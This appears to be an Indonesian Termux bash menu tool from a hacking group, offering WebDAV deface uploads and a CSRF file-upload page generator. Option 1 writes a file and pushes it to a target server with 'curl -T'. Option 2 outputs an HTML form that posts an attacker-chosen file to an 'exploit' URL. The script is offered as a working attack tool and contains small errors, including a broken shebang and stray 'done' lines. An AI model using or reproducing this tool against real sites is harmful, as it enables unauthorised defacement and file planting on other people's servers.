#/data/data/com.termux/files/usr/bin/bash

clear
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'

echo  "$green ________________________________________"
echo    $gold  "|[Author           ]:INYOURKZY       |"
echo $blue "|[Team             ]:BLACK CYBER CRUSH   |"
echo $yellow "|[phone           ]:0888-0984-3498     |"
echo   $green "_______________________________________"
echo   "        gunakan dengan baik"
echo   " =============================="
echo 
sleep 1
echo  "<============================>" | lolcat
echo  $b "1. Webdav${enda}";
echo  "<============================>" | lolcat
echo  $b "2. Script CSRF${enda}";
echo  "<============================>" | lolcat
echo  $b "3. Keluar${enda}";
echo  "<============================>" | lolcat
echo  "silahkan pilih" | lolcat
read -p "daftar diatas =>" pil;
# Webdav
case $pil in
1) echo "===== Tulis nama sc lu =====" | lolcat
sleep 2
read nama
echo "===== Copas text sc ======" | lolcat
sleep 2
echo "===== kalo sudah tercopas tekan :wq =====" | lolcat 
echo "===== exsistensi contoh : .html .txt =====>" | lolcat
read script
vim $nama$script
sleep 3
echo "=====Masukin link ====> "
read target
curl -T $script $target
echo "liat $target$script" | lolcat
;;
2) echo "===== Judul sc lu =====" | lolcat
read nama
sleep 2
echo "===== Nama SC ======" | lolcat
read n
sleep 2
echo "===== warna font =====" | lolcat
read w
sleep 2
echo "===== background =====" | lolcat
read ww
sleep 2
echo "===== link gambar  =====" | lolcat 
read l
sleep 2
echo "===== link n exploit =====" | lolcat
read so
sleep 2
echo "===== autho By ?  =====" | lolcat
read f
sleep 2
echo "===== sedang memproses ....." | lolcat
sleep 5
echo "=========>>>> silahkan copas <<<<=========

<title>$nama</title>


<center>
<h1>$n</h1>
<br>
	<img src="$l" width= "150" height= "150"/>
	<body style="color: $w ; background-color:$ww ;">
<h2>CSRF</h2>
<marquee loop="100" direction="left"><b>_______________________________________</b></marquee>
<marquee loop="100" direction="right"><b>_______________________________________</b></marquee>
<br>
<br>
<br>
	<form method="POST" action="$so" enctype="multipart/form-data"> 
	
<input type="file" name="file"><button>Unggah</button>
</form>
</font>
</center>
<br><br>
<font size="5" color="red">
<b><u>Author</u></b>
</font>
<br>
<font size="4" color="$w">
 => $f
	</font>           

<=== silahkan dicopy sampe sini ===>"
;;
3) echo "Thanks telah menggunakan tools kami" | lolcat
exit
;;
esac
done
done